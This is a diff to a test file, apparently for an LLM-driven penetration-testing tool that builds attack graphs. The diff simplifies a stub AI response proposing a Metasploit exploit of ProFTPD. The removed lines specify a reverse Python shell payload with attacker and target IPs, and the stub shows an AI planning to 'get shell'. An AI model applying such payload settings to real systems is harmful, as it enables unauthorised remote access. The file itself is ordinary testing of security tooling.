@@ -76,19 +76,12 @@ def make_graph_with_recon_done() -> AttackGraph:
 
 
 def make_stub_response(module: str) -> object:
-    """Synthesize an LLM JSON response proposing a new_node with the given module."""
+    """Synthesize an LLM JSON response. Uses Stage 4's tiny-intent schema."""
     payload = {
-        "action": "new_node",
-        "id": "exploit_proftpd",
+        "action": "use_module",
+        "target_hint": module,
         "label": f"Exploit via {module.rsplit('/', 1)[-1]}",
         "goal": "Get shell via ProFTPD",
-        "agent_type": "exploit",
-        "objective": "Run the exploit",
-        "tool_name": "metasploit",
-        "module": module,
-        "module_options": {"RHOSTS": "192.168.34.7", "RPORT": 21},
-        "payload": "cmd/unix/reverse_python",
-        "payload_options": {"LHOST": "192.168.34.6", "LPORT": 4444},
         "rationale": "ProFTPD detected on 21",
     }
 
@@ -150,14 +143,14 @@ def test_mismatch_is_advisory():
 
     check("returns a new node id (not None)", result is not None,
           detail=f"got {result!r}")
-    check("new node was added to graph", "exploit_proftpd" in graph.nodes)
-    check("new edge recon → exploit_proftpd exists",
-          any(e.source == "recon" and e.target == "exploit_proftpd"
+    check("new node was added to graph", result in graph.nodes)
+    check("new edge recon -> new node exists",
+          any(e.source == "recon" and e.target == result
               for e in graph.edges))
 
     # The persisted edge must NOT have hard version checks
     edge = next((e for e in graph.edges
-                 if e.source == "recon" and e.target == "exploit_proftpd"), None)
+                 if e.source == "recon" and e.target == result), None)
     edge_check_count = len(edge.checks) if edge else -1
     check("edge has no persisted hard version checks (checks==[])",
           edge is not None and len(edge.checks) == 0,
